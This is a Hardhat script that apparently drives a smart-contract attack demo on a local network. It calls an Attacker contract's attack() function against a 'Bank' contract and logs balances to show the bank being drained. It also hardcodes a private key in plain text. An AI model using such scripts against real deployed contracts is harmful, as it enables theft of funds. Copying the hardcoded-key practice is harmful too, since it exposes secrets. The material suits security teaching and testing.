// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

let BANK = "0x1429859428C0aBc9C2C47C8Ee9FBaf82cFA0F20f";
let ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
let ATTACKERCONT = "0x922D6956C99E12DFeB3224DEA977D0939758A1Fe";
let PRIVATEKEY =
	"0xf2988f8ed77e42527e7b8fc2ee27a3fb5cfe703780f831536d7c9ebb3abb85b9";

async function main() {
	//it("Perform Attack", async function () {

	// For Hardhat
	const contract = require("../artifacts/contracts/Attacker.sol/Attacker.json");

	const [owner, addr1] = await ethers.getSigners(); //must use first signer

	// Contract
	const attackerContract = new ethers.Contract(
		ATTACKERCONT,
		contract.abi,
		owner
	);

	console.log(`${owner.address}`);
	console.log(JSON.stringify(contract.abi));

	console.log("");
	console.log("*** Before ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attacker's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);

	await attackerContract.attack({
		value: ethers.utils.parseEther("1"),
	});

	console.log("");
	console.log("*** After ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attackers's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);
	console.log("");

	// expect(await ethers.provider.getBalance(this.bankContract.address)).to.eq(
	// 	0
	// );
	//});
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
